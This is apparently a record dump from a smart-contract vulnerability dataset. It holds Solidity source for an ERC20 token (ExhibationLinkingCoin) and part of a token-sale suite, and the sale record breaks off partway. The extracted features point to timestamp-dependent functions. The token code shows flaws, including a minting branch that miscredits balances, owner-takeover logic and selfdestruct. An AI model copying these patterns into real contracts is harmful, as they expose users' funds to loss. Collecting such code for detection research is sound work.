{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1eea"
  },
  "filename": "2711.sol",
  "content": "pragma solidity ^0.4.21;\ncontract ERC20Interface {\n function totalSupply() public constant returns (uint);\n function balanceOf(address tokenOwner) public constant returns (uint balance);\n function allowance(address tokenOwner, address spender) public constant returns (uint remaining);\n function transfer(address to, uint tokens) public returns (bool success);\n function approve(address spender, uint tokens) public returns (bool success);\n function transferFrom(address from, address to, uint tokens) public returns (bool success);\n event Transfer(address indexed from, address indexed to, uint tokens);\n event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n}\nlibrary IterableMapping\n{\n struct itmap\n {\n mapping(address => IndexValue) data;\n KeyFlag[] keys;\n uint size;\n }\n struct IndexValue { uint keyIndex; uint256 value; }\n struct KeyFlag { address key; bool deleted; }\n function insert(itmap storage self, address key, uint256 value) returns (bool replaced)\n {\n uint keyIndex = self.data[key].keyIndex;\n self.data[key].value = value;\n if (keyIndex > 0)\n return true;\n else\n {\n keyIndex = self.keys.length++;\n self.data[key].keyIndex = keyIndex + 1;\n self.keys[keyIndex].key = key;\n self.size++;\n return false;\n }\n }\n function remove(itmap storage self, address key) returns (bool success)\n {\n uint keyIndex = self.data[key].keyIndex;\n if (keyIndex == 0)\n return false;\n delete self.data[key];\n self.keys[keyIndex - 1].deleted = true;\n self.size --;\n }\n function contains(itmap storage self, address key) returns (bool)\n {\n return self.data[key].keyIndex > 0;\n }\n function iterate_start(itmap storage self) returns (uint keyIndex)\n {\n return iterate_next(self, uint(-1));\n }\n function iterate_valid(itmap storage self, uint keyIndex) returns (bool)\n {\n return keyIndex < self.keys.length;\n }\n function iterate_next(itmap storage self, uint keyIndex) returns (uint r_keyIndex)\n {\n keyIndex++;\n while (keyIndex < self.keys.length && self.keys[keyIndex].deleted)\n keyIndex++;\n return keyIndex;\n }\n function iterate_get(itmap storage self, uint keyIndex) returns (address key, uint256 value)\n {\n key = self.keys[keyIndex].key;\n value = self.data[key].value;\n }\n}\ncontract ExhibationLinkingCoin is ERC20Interface {\n function totalSupply()public constant returns (uint) {\n return totalEXLCSupply;\n }\n function balanceOf(address tokenOwner)public constant returns (uint balance) {\n return balances[tokenOwner];\n }\n function transfer(address to, uint tokens)public returns (bool success) {\n if (balances[msg.sender] >= tokens && tokens > 0 && balances[to] + tokens > balances[to]) {\n if(lockedUsers[msg.sender].lockedTokens > 0){\n TryUnLockBalance(msg.sender);\n if(balances[msg.sender] - tokens < lockedUsers[msg.sender].lockedTokens)\n {\n return false;\n }\n }\n balances[msg.sender] -= tokens;\n balances[to] += tokens;\n emit Transfer(msg.sender, to, tokens);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint tokens)public returns (bool success) {\n if (balances[from] >= tokens && allowed[from].data[to].value >= tokens && tokens > 0 && balances[to] + tokens > balances[to]) {\n if(lockedUsers[from].lockedTokens > 0)\n {\n TryUnLockBalance(from);\n if(balances[from] - tokens < lockedUsers[from].lockedTokens)\n {\n return false;\n }\n }\n balances[from] -= tokens;\n allowed[from].data[msg.sender].value -= tokens;\n balances[to] += tokens;\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint tokens)public returns (bool success) {\n IterableMapping.insert(allowed[msg.sender], spender, tokens);\n return true;\n }\n function allowance(address tokenOwner, address spender)public constant returns (uint remaining) {\n return allowed[tokenOwner].data[spender].value;\n }\n string public name = \"ExhibationLinkingCoin\";\n string public symbol = \"EXLC\";\n uint8 public decimals = 18;\n uint256 private totalEXLCSupply = 10000000000000000000000000000;\n uint256 private _totalBalance = totalEXLCSupply;\n struct LockUser{\n uint256 lockedTokens;\n uint lockedTime;\n uint lockedIdx;\n }\n address public owner = 0x0;\n address public auther_user = 0x0;\n address public operater = 0x0;\n mapping (address => uint256) balances;\n mapping(address => IterableMapping.itmap) allowed;\n mapping(address => LockUser) lockedUsers;\n uint constant private ONE_DAY_TIME_LEN = 86400;\n uint constant private ONE_YEAR_TIME_LEN = 946080000;\n uint32 private constant MAX_UINT32 = 0xFFFFFFFF;\n uint256 public creatorsTotalBalance = 1130000000000000000000000000;\n uint256 public jiGouTotalBalance = 1000000000000000000000000000;\n uint256 public icoTotalBalance = 1000000000000000000000000000;\n uint256 public mineTotalBalance = 2000000000000000000000000000;\n uint256 public marketorsTotalBalance = 685000000000000000000000000;\n uint256 public businessersTotalBalance = 685000000000000000000000000;\n uint256 public taskTotalBalance = 3500000000000000000000000000;\n uint256 public mineBalance = 0;\n bool public isIcoStart = false;\n bool public isIcoFinished = false;\n uint256 public icoPrice = 500000000000000000000000;\n uint256[] public mineBalanceArry = new uint256[](30);\n uint public lastUnlockMineBalanceTime = 0;\n uint public dayIdx = 0;\n event SendTo(uint32 indexed _idx, uint8 indexed _type, address _from, address _to, uint256 _value);\n uint32 sendToIdx = 0;\n function safeToNextIdx() internal{\n if (sendToIdx >= MAX_UINT32){\n sendToIdx = 1;\n }\n else{\n sendToIdx += 1;\n }\n }\n constructor() public {\n owner = msg.sender;\n mineBalanceArry[0] = 1000000000000000000000000;\n for(uint i=1; i<30; i++){\n mineBalanceArry[i] = mineBalanceArry[i-1] * 99 / 100;\n }\n mineBalance = taskTotalBalance;\n balances[owner] = mineBalance;\n lastUnlockMineBalanceTime = block.timestamp;\n }\n function StartIco() public {\n if ((msg.sender != operater && msg.sender != auther_user && msg.sender != owner) || isIcoStart)\n {\n revert();\n }\n isIcoStart = true;\n isIcoFinished = false;\n }\n function StopIco() public {\n if ((msg.sender != operater && msg.sender != auther_user && msg.sender != owner) || isIcoFinished)\n {\n revert();\n }\n balances[owner] += icoTotalBalance;\n icoTotalBalance = 0;\n isIcoStart = false;\n isIcoFinished = true;\n }\n function () public payable\n {\n uint256 coin;\n if(isIcoFinished || !isIcoStart)\n {\n revert();\n }\n coin = msg.value * icoPrice / 1 ether;\n if(coin > icoTotalBalance)\n {\n revert();\n }\n icoTotalBalance -= coin;\n _totalBalance -= coin;\n balances[msg.sender] += coin;\n emit Transfer(operater, msg.sender, coin);\n safeToNextIdx();\n emit SendTo(sendToIdx, 2, 0x0, msg.sender, coin);\n }\n function TryUnLockBalance(address target) public {\n if(target == 0x0)\n {\n revert();\n }\n LockUser storage user = lockedUsers[target];\n if(user.lockedIdx > 0 && user.lockedTokens > 0)\n {\n if(block.timestamp >= user.lockedTime)\n {\n if(user.lockedIdx == 1)\n {\n user.lockedIdx = 0;\n user.lockedTokens = 0;\n }\n else\n {\n uint256 append = user.lockedTokens/user.lockedIdx;\n user.lockedTokens -= append;\n user.lockedIdx--;\n user.lockedTime = block.timestamp + ONE_YEAR_TIME_LEN;\n lockedUsers[target] = user;\n }\n }\n }\n }\n function QueryUnlockTime(address target) public constant returns (uint time) {\n if(target == 0x0)\n {\n revert();\n }\n LockUser storage user = lockedUsers[target];\n if(user.lockedIdx > 0 && user.lockedTokens > 0)\n {\n return user.lockedTime;\n }\n return 0x0;\n }\n function miningEveryDay() public{\n if (msg.sender != operater && msg.sender != auther_user && msg.sender != owner)\n {\n revert();\n }\n uint day = uint((block.timestamp - lastUnlockMineBalanceTime) / ONE_DAY_TIME_LEN);\n if(day > 0){\n int max_while = 30;\n uint256 val;\n while(day > 0 && max_while > 0 && mineTotalBalance > 0){\n max_while--;\n day -= 1;\n dayIdx += 1;\n val = mineBalanceArry[(dayIdx/365) % 30];\n if(mineTotalBalance >= val)\n {\n mineBalance += val;\n mineTotalBalance -= val;\n balances[owner] += val;\n }\n else\n {\n mineBalance += mineTotalBalance;\n mineTotalBalance = 0;\n balances[owner] += mineTotalBalance;\n break;\n }\n }\n lastUnlockMineBalanceTime = block.timestamp;\n }\n }\n function sendMinerByOwner(address _to, uint256 _value) public {\n if (msg.sender != operater && msg.sender != auther_user && msg.sender != owner)\n {\n revert();\n }\n if(_to == 0x0){\n revert();\n }\n if(_value > mineBalance){\n revert();\n }\n mineBalance -= _value;\n balances[owner] -= _value;\n balances[_to] += _value;\n _totalBalance -= _value;\n emit Transfer(msg.sender, _to, _value);\n safeToNextIdx();\n emit SendTo(sendToIdx, 3, owner, _to, _value);\n }\n function sendICOByOwner(address _to, uint256 _value) public {\n if (msg.sender != operater && msg.sender != owner && msg.sender != auther_user)\n {\n revert();\n }\n if(_to == 0x0){\n revert();\n }\n if(!isIcoFinished && isIcoStart)\n {\n revert();\n }\n if(_value > icoTotalBalance){\n revert();\n }\n icoTotalBalance -= _value;\n _totalBalance -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n safeToNextIdx();\n emit SendTo(sendToIdx, 6, 0x0, _to, _value);\n }\n function sendCreatorByOwner(address _to, uint256 _value) public {\n if (msg.sender != operater && msg.sender != owner && msg.sender != auther_user)\n {\n revert();\n }\n if(_to == 0x0){\n revert();\n }\n if(_value > creatorsTotalBalance){\n revert();\n }\n creatorsTotalBalance -= _value;\n _totalBalance -= _value;\n balances[_to] += _value;\n LockUser storage lockUser = lockedUsers[_to];\n lockUser.lockedTime = block.timestamp + ONE_YEAR_TIME_LEN;\n lockUser.lockedTokens += _value;\n lockUser.lockedIdx = 2;\n lockedUsers[_to] = lockUser;\n emit Transfer(msg.sender, _to, _value);\n safeToNextIdx();\n emit SendTo(sendToIdx, 4, 0x0, _to, _value);\n }\n function sendJigouByOwner(address _to, uint256 _value) public {\n if (msg.sender != operater && msg.sender != owner && msg.sender != auther_user)\n {\n revert();\n }\n if(_to == 0x0){\n revert();\n }\n if(_value > jiGouTotalBalance){\n revert();\n }\n jiGouTotalBalance -= _value;\n _totalBalance -= _value;\n balances[_to] += _value;\n LockUser storage lockUser = lockedUsers[_to];\n lockUser.lockedTime = block.timestamp + ONE_YEAR_TIME_LEN;\n lockUser.lockedTokens += _value;\n lockUser.lockedIdx = 1;\n lockedUsers[_to] = lockUser;\n emit Transfer(msg.sender, _to, _value);\n safeToNextIdx();\n emit SendTo(sendToIdx, 4, 0x0, _to, _value);\n }\n function sendMarketByOwner(address _to, uint256 _value) public {\n if (msg.sender != operater && msg.sender != owner && msg.sender != auther_user)\n {\n revert();\n }\n if(_to == 0x0){\n revert();\n }\n if(_value > marketorsTotalBalance){\n revert();\n }\n marketorsTotalBalance -= _value;\n _totalBalance -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n safeToNextIdx();\n emit SendTo(sendToIdx, 7, 0x0, _to, _value);\n }\n function sendBussinessByOwner(address _to, uint256 _value) public {\n if (msg.sender != operater && msg.sender != owner && msg.sender != auther_user)\n {\n revert();\n }\n if(_to == 0x0){\n revert();\n }\n if(_value > businessersTotalBalance){\n revert();\n }\n businessersTotalBalance -= _value;\n _totalBalance -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n safeToNextIdx();\n emit SendTo(sendToIdx, 5, 0x0, _to, _value);\n }\n function Save() public {\n if (msg.sender != owner) {\n revert();\n }\n owner.transfer(address(this).balance);\n }\n function changeAutherOwner(address newOwner) public {\n if ((msg.sender != owner && msg.sender != auther_user) || newOwner == 0x0)\n {\n revert();\n }\n else\n {\n if(msg.sender != owner)\n {\n balances[msg.sender] = balances[owner];\n for (var i = IterableMapping.iterate_start(allowed[owner]); IterableMapping.iterate_valid(allowed[owner], i); i = IterableMapping.iterate_next(allowed[owner], i))\n {\n var (key, value) = IterableMapping.iterate_get(allowed[owner], i);\n IterableMapping.insert(allowed[msg.sender], key, value);\n }\n balances[owner] = 0;\n for (var j = IterableMapping.iterate_start(allowed[owner]); IterableMapping.iterate_valid(allowed[owner], j); j = IterableMapping.iterate_next(allowed[owner], j))\n {\n var (key2, value2) = IterableMapping.iterate_get(allowed[owner], j);\n IterableMapping.remove(allowed[owner], key2);\n }\n }\n auther_user = newOwner;\n owner = msg.sender;\n }\n }\n function destruct() public {\n if (msg.sender != owner)\n {\n revert();\n }\n else\n {\n selfdestruct(owner);\n }\n }\n function setOperater(address op) public {\n if ((msg.sender != owner && msg.sender != auther_user && msg.sender != operater) || op == 0x0)\n {\n revert();\n }\n else\n {\n operater = op;\n }\n }\n}",
  "extract_feature": [
    "function TryUnLockBalance(address target) public {\nif(target == 0x0)\n{\nrevert();\n}\nLockUser storage user = lockedUsers[target];\nif(user.lockedIdx > 0 && user.lockedTokens > 0)\n{\nif(block.timestamp >= user.lockedTime)\n{\nif(user.lockedIdx == 1)\n{\nuser.lockedIdx = 0;\nuser.lockedTokens = 0;\n}\nelse\n{\nuint256 append = user.lockedTokens/user.lockedIdx;\nuser.lockedTokens -= append;\nuser.lockedIdx--;\nuser.lockedTime = block.timestamp + ONE_YEAR_TIME_LEN;\nlockedUsers[target] = user;\n}\n}\n}\n}",
    "function miningEveryDay() public{\nif (msg.sender != operater && msg.sender != auther_user && msg.sender != owner)\n{\nrevert();\n}\nuint day = uint((block.timestamp - lastUnlockMineBalanceTime) / ONE_DAY_TIME_LEN);\nif(day > 0){\nint max_while = 30;\nuint256 val;\nwhile(day > 0 && max_while > 0 && mineTotalBalance > 0){\nmax_while--;\nday -= 1;\ndayIdx += 1;\nval = mineBalanceArry[(dayIdx/365) % 30];\nif(mineTotalBalance >= val)\n{\nmineBalance += val;\nmineTotalBalance -= val;\nbalances[owner] += val;\n}\nelse\n{\nmineBalance += mineTotalBalance;\nmineTotalBalance = 0;\nbalances[owner] += mineTotalBalance;\nbreak;\n}\n}\nlastUnlockMineBalanceTime = block.timestamp;\n}\n}",
    "function sendCreatorByOwner(address _to, uint256 _value) public {\nif (msg.sender != operater && msg.sender != owner && msg.sender != auther_user)\n{\nrevert();\n}\nif(_to == 0x0){\nrevert();\n}\nif(_value > creatorsTotalBalance){\nrevert();\n}\ncreatorsTotalBalance -= _value;\n_totalBalance -= _value;\nbalances[_to] += _value;\nLockUser storage lockUser = lockedUsers[_to];\nlockUser.lockedTime = block.timestamp + ONE_YEAR_TIME_LEN;\nlockUser.lockedTokens += _value;\nlockUser.lockedIdx = 2;\nlockedUsers[_to] = lockUser;\nemit Transfer(msg.sender, _to, _value);\nsafeToNextIdx();\nemit SendTo(sendToIdx, 4, 0x0, _to, _value);\n}",
    "function sendJigouByOwner(address _to, uint256 _value) public {\nif (msg.sender != operater && msg.sender != owner && msg.sender != auther_user)\n{\nrevert();\n}\nif(_to == 0x0){\nrevert();\n}\nif(_value > jiGouTotalBalance){\nrevert();\n}\njiGouTotalBalance -= _value;\n_totalBalance -= _value;\nbalances[_to] += _value;\nLockUser storage lockUser = lockedUsers[_to];\nlockUser.lockedTime = block.timestamp + ONE_YEAR_TIME_LEN;\nlockUser.lockedTokens += _value;\nlockUser.lockedIdx = 1;\nlockedUsers[_to] = lockUser;\nemit Transfer(msg.sender, _to, _value);\nsafeToNextIdx();\nemit SendTo(sendToIdx, 4, 0x0, _to, _value);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1eeb"
  },
  "filename": "2736.sol",
  "content": "pragma solidity 0.4.24;\ninterface DisbursementHandlerI {\n function withdraw(address _beneficiary, uint256 _index) external;\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n require(token.transfer(to, value));\n }\n function safeTransferFrom(\n ERC20 token,\n address from,\n address to,\n uint256 value\n )\n internal\n {\n require(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n require(token.approve(spender, value));\n }\n}\ncontract DisbursementHandler is DisbursementHandlerI, Ownable {\n using SafeMath for uint256;\n using SafeERC20 for ERC20;\n struct Disbursement {\n uint256 timestamp;\n uint256 value;\n }\n event Setup(address indexed _beneficiary, uint256 _timestamp, uint256 _value);\n event TokensWithdrawn(address indexed _to, uint256 _value);\n ERC20 public token;\n uint256 public totalAmount;\n mapping(address => Disbursement[]) public disbursements;\n constructor(ERC20 _token) public {\n require(_token != address(0));\n token = _token;\n }\n function setupDisbursement(\n address _beneficiary,\n uint256 _value,\n uint256 _timestamp\n )\n external\n onlyOwner\n {\n require(block.timestamp < _timestamp);\n disbursements[_beneficiary].push(Disbursement(_timestamp, _value));\n totalAmount = totalAmount.add(_value);\n emit Setup(_beneficiary, _timestamp, _value);\n }\n function withdraw(address _beneficiary, uint256 _index)\n external\n {\n Disbursement[] storage beneficiaryDisbursements = disbursements[_beneficiary];\n require(_index < beneficiaryDisbursements.length);\n Disbursement memory disbursement = beneficiaryDisbursements[_index];\n require(disbursement.timestamp < now && disbursement.value > 0);\n delete beneficiaryDisbursements[_index];\n token.safeTransfer(_beneficiary, disbursement.value);\n emit TokensWithdrawn(_beneficiary, disbursement.value);\n }\n}\ninterface VaultI {\n function deposit(address contributor) external payable;\n function saleSuccessful() external;\n function enableRefunds() external;\n function refund(address contributor) external;\n function close() external;\n function sendFundsToWallet() external;\n}\nlibrary Math {\n function max64(uint64 a, uint64 b) internal pure returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal pure returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal pure returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal pure returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Vault is VaultI, Ownable {\n using SafeMath for uint256;\n enum State { Active, Success, Refunding, Closed }\n uint256 public firstDepositTimestamp;\n mapping (address => uint256) public deposited;\n uint256 public disbursementWei;\n uint256 public disbursementDuration;\n address public trustedWallet;\n uint256 public initialWei;\n uint256 public nextDisbursement;\n uint256 public totalDeposited;\n uint256 public refundable;\n State public state;\n event Closed();\n event RefundsEnabled();\n event Refunded(address indexed contributor, uint256 amount);\n modifier atState(State _state) {\n require(state == _state);\n _;\n }\n constructor (\n address _wallet,\n uint256 _initialWei,\n uint256 _disbursementWei,\n uint256 _disbursementDuration\n )\n public\n {\n require(_wallet != address(0));\n require(_disbursementWei != 0);\n trustedWallet = _wallet;\n initialWei = _initialWei;\n disbursementWei = _disbursementWei;\n disbursementDuration = _disbursementDuration;\n state = State.Active;\n }\n function deposit(address _contributor) onlyOwner external payable {\n require(state == State.Active || state == State.Success);\n if (firstDepositTimestamp == 0) {\n firstDepositTimestamp = now;\n }\n totalDeposited = totalDeposited.add(msg.value);\n deposited[_contributor] = deposited[_contributor].add(msg.value);\n }\n function saleSuccessful()\n onlyOwner\n external\n atState(State.Active)\n {\n state = State.Success;\n transferToWallet(initialWei);\n }\n function enableRefunds() onlyOwner external {\n require(state != State.Refunding);\n state = State.Refunding;\n uint256 currentBalance = address(this).balance;\n refundable = currentBalance <= totalDeposited ? currentBalance : totalDeposited;\n emit RefundsEnabled();\n }\n function refund(address _contributor) external atState(State.Refunding) {\n require(deposited[_contributor] > 0);\n uint256 refundAmount = deposited[_contributor].mul(refundable).div(totalDeposited);\n deposited[_contributor] = 0;\n _contributor.transfer(refundAmount);\n emit Refunded(_contributor, refundAmount);\n }\n function close() external atState(State.Success) onlyOwner {\n state = State.Closed;\n nextDisbursement = now;\n emit Closed();\n }\n function sendFundsToWallet() external atState(State.Closed) {\n require(nextDisbursement <= now);\n if (disbursementDuration == 0) {\n trustedWallet.transfer(address(this).balance);\n return;\n }\n uint256 numberOfDisbursements = now.sub(nextDisbursement).div(disbursementDuration).add(1);\n nextDisbursement = nextDisbursement.add(disbursementDuration.mul(numberOfDisbursements));\n transferToWallet(disbursementWei.mul(numberOfDisbursements));\n }\n function transferToWallet(uint256 _amount) internal {\n uint256 amountToSend = Math.min256(_amount, address(this).balance);\n trustedWallet.transfer(amountToSend);\n }\n}\ninterface WhitelistableI {\n function changeAdmin(address _admin) external;\n function invalidateHash(bytes32 _hash) external;\n function invalidateHashes(bytes32[] _hashes) external;\n}\nlibrary ECRecovery {\n function recover(bytes32 hash, bytes sig)\n internal\n pure\n returns (address)\n {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65) {\n return (address(0));\n }\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27) {\n v += 27;\n }\n if (v != 27 && v != 28) {\n return (address(0));\n } else {\n return ecrecover(hash, v, r, s);\n }\n }\n function toEthSignedMessageHash(bytes32 hash)\n internal\n pure\n returns (bytes32)\n {\n return keccak256(\n \"\\x19Ethereum Signed Message:\\n32\",\n hash\n );\n }\n}\ncontract Whitelistable is WhitelistableI, Ownable {\n using ECRecovery for bytes32;\n address public whitelistAdmin;\n mapping(bytes32 => bool) public invalidHash;\n event AdminUpdated(address indexed newAdmin);\n modifier validAdmin(address _admin) {\n require(_admin != 0);\n _;\n }\n modifier onlyAdmin {\n require(msg.sender == whitelistAdmin);\n _;\n }\n modifier isWhitelisted(bytes32 _hash, bytes _sig) {\n require(checkWhitelisted(_hash, _sig));\n _;\n }\n constructor(address _admin) public validAdmin(_admin) {\n whitelistAdmin = _admin;\n }\n function changeAdmin(address _admin)\n external\n onlyOwner\n validAdmin(_admin)\n {\n emit AdminUpdated(_admin);\n whitelistAdmin = _admin;\n }\n function invalidateHash(bytes32 _hash) external onlyAdmin {\n invalidHash[_hash] = true;\n }\n function invalidateHashes(bytes32[] _hashes) external onlyAdmin {\n for (uint i = 0; i < _hashes.length; i++) {\n invalidHash[_hashes[i]] = true;\n }\n }\n function checkWhitelisted(\n bytes32 _rawHash,\n bytes _sig\n )\n public\n view\n returns(bool)\n {\n bytes32 hash = _rawHash.toEthSignedMessageHash();\n return !invalidHash[_rawHash] && whitelistAdmin == hash.recover(_sig);\n }\n}\ninterface EthPriceFeedI {\n function getUnit() external view returns(string);\n function getRate() external view returns(uint256);\n function getLastTimeUpdated() external view returns(uint256);\n}\ninterface SaleI {\n function setup() external;\n function changeEthPriceFeed(EthPriceFeedI newPriceFeed) external;\n function contribute(address _contributor, uint256 _limit, uint256 _expiration, bytes _sig) external payable;\n function allocateExtraTokens(address _contributor) external;\n function setEndTime(uint256 _endTime) external;\n function endSale() external;\n}\ncontract StateMachine {\n struct State {\n bytes32 nextStateId;\n mapping(bytes4 => bool) allowedFunctions;\n function() internal[] transitionCallbacks;\n function(bytes32) internal returns(bool)[] startConditions;\n }\n mapping(bytes32 => State) states;\n bytes32 private currentStateId;\n event Transition(bytes32 stateId, uint256 blockNumber);\n modifier checkAllowed {\n conditionalTransitions();\n require(states[currentStateId].allowedFunctions[msg.sig]);\n _;\n }\n function conditionalTransitions() public {\n bool checkNextState;\n do {\n checkNextState = false;\n bytes32 next = states[currentStateId].nextStateId;\n for (uint256 i = 0; i < states[next].startConditions.length; i++) {\n if (states[next].startConditions[i](next)) {\n goToNextState();\n checkNextState = true;\n break;\n }\n }\n } while (checkNextState);\n }\n function getCurrentStateId() view public returns(bytes32) {\n return currentStateId;\n }\n function setStates(bytes32[] _stateIds) internal {\n require(_stateIds.length > 0);\n require(currentStateId == 0);\n require(_stateIds[0] != 0);\n currentStateId = _stateIds[0];\n for (uint256 i = 1; i < _stateIds.length; i++) {\n require(_stateIds[i] != 0);\n states[_stateIds[i - 1]].nextStateId = _stateIds[i];\n require(states[_stateIds[i]].nextStateId == 0);\n }\n }\n function allowFunction(bytes32 _stateId, bytes4 _functionSelector)\n internal\n {\n states[_stateId].allowedFunctions[_functionSelector] = true;\n }\n function goToNextState() internal {\n bytes32 next = states[currentStateId].nextStateId;\n require(next != 0);\n currentStateId = next;\n for (uint256 i = 0; i < states[next].transitionCallbacks.length; i++) {\n states[next].transitionCallbacks[i]();\n }\n emit Transition(next, block.number);\n }\n function addStartCondition(\n bytes32 _stateId,\n function(bytes32) internal returns(bool) _condition\n )\n internal\n {\n states[_stateId].startConditions.push(_condition);\n }\n function addCallback(bytes32 _stateId, function() internal _callback)\n internal\n {\n states[_stateId].transitionCallbacks.push(_callback);\n }\n}\ncontract TimedStateMachine is StateMachine {\n event StateStartTimeSet(bytes32 indexed _stateId, uint256 _startTime);\n mapping(bytes32 => uint256) private startTime;\n function getStateStartTime(bytes32 _stateId) public view returns(uint256) {\n return startTime[_stateId];\n }\n function setStateStartTime(bytes32 _stateId, uint256 _timestamp) internal {\n require(block.timestamp < _timestamp);\n if (startTime[_stateId] == 0) {\n addStartCondition(_stateId, hasStartTimePassed);\n }\n startTime[_stateId] = _timestamp;\n emit StateStartTimeSet(_stateId, _timestamp);\n }\n function hasStartTimePassed(bytes32 _stateId) internal returns(bool) {\n return startTime[_stateId] <= block.timestamp;\n }\n}\ncontract TokenControllerI {\n function transferAllowed(address _from, address _to)\n external\n view\n returns (bool);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n )\n public\n returns (bool)\n {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(\n address _owner,\n address _spender\n )\n public\n view\n returns (uint256)\n {\n return allowed[_owner][_spender];\n }\n function increaseApproval(\n address _spender,\n uint _addedValue\n )\n public\n returns (bool)\n {\n allowed[msg.sender][_spender] = (\n allowed[msg.sender][_spender].add(_addedValue));\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(\n address _spender,\n uint _subtractedValue\n )\n public\n returns (bool)\n {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract ControllableToken is Ownable, StandardToken {\n TokenControllerI public controller;\n modifier isAllowed(address _from, address _to) {\n require(controller.transferAllowed(_from, _to));\n _;\n }\n function setController(TokenControllerI _controller) onlyOwner public {\n require(_controller != address(0));\n controller = _controller;\n }\n function transfer(address _to, uint256 _value)\n isAllowed(msg.sender, _to)\n public\n returns (bool)\n {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint256 _value)\n isAllowed(_from, _to)\n public\n returns (bool)\n {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract DetailedERC20 is ERC20 {\n string public name;\n string public symbol;\n uint8 public decimals;\n constructor(string _name, string _symbol, uint8 _decimals) public {\n name = _name;\n symbol = _symbol;\n decimals = _decimals;\n }\n}\ncontract Token is ControllableToken, DetailedERC20 {\n constructor(\n uint256 _supply,\n string _name,\n string _symbol,\n uint8 _decimals\n ) DetailedERC20(_name, _symbol, _decimals) public {\n require(_supply != 0);\n totalSupply_ = _supply;\n balances[msg.sender] = _supply;\n emit Transfer(address(0), msg.sender, _supply);\n }\n}\ncontract Sale is SaleI, Ownable, Whitelistable, TimedStateMachine, TokenControllerI {\n using SafeMath for uint256;\n using SafeERC20 for Token;\n bytes32 private constant SETUP = \"setup\";\n bytes32 private constant FREEZE = \"freeze\";\n bytes32 private constant SALE_IN_PROGRESS = \"saleInProgress\";\n bytes32 private constant SALE_ENDED = \"saleEnded\";\n bytes32[] public states = [SETUP, FREEZE, SALE_IN_PROGRESS, SALE_ENDED];\n mapping(address => uint256) public unitContributions;\n mapping(address => bool) public extraTokensAllocated;\n DisbursementHandler public disbursementHandler;\n uint256 public totalContributedUnits = 0;\n uint256 public totalSaleCapUnits;\n uint256 public minContributionUnits;\n uint256 public minThresholdUnits;\n uint256 public saleTokensPerUnit;\n uint256 public extraTokensPerUnit;\n uint256 public tokensForSale;\n Token public trustedToken;\n 